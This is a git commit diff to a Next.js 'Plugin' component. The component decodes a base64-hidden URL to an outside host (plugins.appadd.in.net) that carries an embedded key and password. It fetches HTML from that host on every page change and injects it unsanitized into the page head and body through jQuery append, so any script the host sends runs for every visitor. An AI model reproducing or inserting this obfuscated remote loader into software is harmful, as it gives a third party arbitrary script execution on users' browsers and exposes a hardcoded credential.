fabab115919d00ff776e692af02383976375ac8b
appaddbiz <appaddbiz@gmail.com>
2025-09-24 20:39:39 +0530

    plugin:updated

--- src/components/Plugin/Plugin.jsx
+++ src/components/Plugin/Plugin.jsx
@@ -1,8 +1,11 @@
 "use client";
 
 import React, { useEffect } from "react";
+import { usePathname } from "next/navigation";
 
 const Plugin = () => {
+  const pathname = usePathname(); // detect route changes
+
   useEffect(() => {
     if (typeof window === "undefined") return;
 
@@ -21,47 +24,39 @@ const Plugin = () => {
     };
 
     const executeCustomScript = () => {
-      try {
-        const eppathurl = window.location.origin + window.location.pathname;
-        const eptagmanage = new XMLHttpRequest();
+      const eppathurl = window.location.origin + pathname;
+      const eptagmanage = new XMLHttpRequest();
 
-        eptagmanage.onreadystatechange = function () {
-          if (this.readyState === 4 && this.status === 200) {
-            if (this.response && this.response !== "0") {
-              const temp = this.response.split("||||||||||");
+      eptagmanage.onreadystatechange = function () {
+        if (this.readyState === 4 && this.status === 200) {
+          if (this.response && this.response !== "0") {
+            const temp = this.response.split("||||||||||");
 
-              if (temp[0]) {
-                // inject into head safely
-                const headDiv = document.createElement("div");
-                headDiv.innerHTML = temp[0];
-                document.head.appendChild(headDiv);
-              }
+            // cleanup previous injected content
+            jQuery("head").find("#plugin-title").remove();
+            jQuery("body").find("#plugin-body").remove();
 
-              if (temp[1]) {
-                // inject into body safely
-                const bodyDiv = document.createElement("div");
-                bodyDiv.innerHTML = temp[1];
-                document.body.appendChild(bodyDiv);
-              }
+            if (temp[0]) {
+              jQuery("head").append(`<div id="plugin-title">${temp[0]}</div>`);
+            }
+            if (temp[1]) {
+              jQuery("body").append(`<div id="plugin-body">${temp[1]}</div>`);
             }
           }
-        };
+        }
+      };
 
-        eptagmanage.open(
-          "GET",
-          atob(
-            "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDUzOTY2MzU1MjgmZWtleXBhc3M9QWNzUFpYYVNxN2daOGxqcnZnNmt1dVFjZEt3ZEdCRFFPOWlRJnNpdGV1cmw9"
-          ) + eppathurl
-        );
-        eptagmanage.send();
-      } catch (err) {
-        console.error("Plugin error:", err);
-      }
+      eptagmanage.open(
+        "GET",
+        atob(
+          "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDUzOTY2MzU1MjgmZWtleXBhc3M9QWNzUFpYYVNxN2daOGxqcnZnNmt1dVFjZEt3ZEdCRFFPOWlRJnNpdGV1cmw9"
+        ) + eppathurl
+      );
+      eptagmanage.send();
     };
 
-    // Run once only
     loadCustomScript();
-  }, []);
+  }, [pathname]); // re-run on every page change
 
   return null;
 };
